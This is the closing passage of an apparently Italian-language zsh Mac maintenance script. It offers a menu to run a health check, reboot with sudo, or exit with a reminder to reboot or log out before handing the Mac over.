    printf '\a'
    print -r -- ""
    
    while true; do
        print -r -- "${C_TXT}   Scegli come procedere (o usa la scheda '3. Passaggi' nel pannello):${C_RST}"
        print -r -- "     ${C_CYAN}1) Esegui Check Completo Salute Mac (Batteria, Cicli, SSD SMART, FileVault)${C_RST}"
        print -r -- "     ${C_OK}2) Riavvia il Mac adesso (Consigliato per rendere attive tutte le modifiche)${C_RST}"
        print -r -- "     ${C_INFO}3) Esci senza riavviare${C_RST}"
        print -r -- ""
        
        beep_attesa; print -n -- "   Scelta (1-3): "
        scelta_fine=""
        while true; do
            leggi_passo_singolo_mac && print -n -- "   Scelta (1-3): "
            if read -t 1 -r scelta_fine 2>/dev/null; then
                break
            fi
        done
        case "$scelta_fine" in
            1)
                diagnostica_salute_mac
                ;;
            2)
                info "Riavvio del Mac in corso..."
                sudo shutdown -r now 2>/dev/null
                break
                ;;
            3)
                info "Ricordati di riavviare o effettuare il logout prima di consegnare il Mac."
                break
                ;;
            *)
                info "Opzione non valida. Inserisci 1, 2 o 3."
                ;;
        esac
    done
fi

print -r -- ""
printf '\a'
print -r -- "${C_ACC}  Buon lavoro!${C_RST}"
print -r -- ""
